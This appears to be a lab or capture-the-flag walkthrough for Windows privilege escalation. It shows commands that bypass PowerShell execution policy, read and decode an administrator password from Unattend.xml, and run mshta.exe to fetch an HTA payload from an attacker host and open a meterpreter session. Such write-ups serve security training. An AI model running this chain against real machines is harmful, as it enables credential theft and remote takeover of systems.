# Unattended Installation

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2606–2664. Examples are lab-specific and need verification.

In this lab environment, you will be provided with GUI access to a Kali machine and a Windows machine.

Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations. The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) post-exploitation framework has been provided to you on the Windows machine.

**Objective:** Gain access to meterpreter session with high privilege.

Tools: PowerUp.ps1, Metasploit Framework, Powershell

```bash
Step 1: Switch to Attacker Machine for locating a privilege escalation vulnerability.
Step 2: Open powershell.exe terminal to check the current user.
We are running as a student user. The PowerSploit framework and Powerup.ps1 scripts are provided.
Step 3: We will run the powerup.ps1 Powershell script to find privilege escalation vulnerability.
Command:
cd .\Desktop\PowerSploit\Privesc\
ls

Step 4: Import PowerUp.ps1 script and Invoke-PrivescAudit function.

powershell -ep bypass (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit

cat C:\Windows\Panther\Unattend.xml
We have discovered an administrator encoded password. i.e “QWRtaW5AMTIz”.
Step 6: Decoding administrator password using Powershell.

$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password
The administrator password is “Admin@123”.

Step 7: We are running a command prompt as an administrator user using discover credentials.

runas.exe /user:administrator cmd
Admin@123
whoami

We are running cmd.exe as an administrator.
Switch to the Kali Machine.
Step 8: Running the hta_server module to gain the meterpreter shell. Start msfconsole.
Commands:

msfconsole -q
use exploit/windows/misc/hta_server
exploit

mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
sessions -i 1
cd /
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt

```
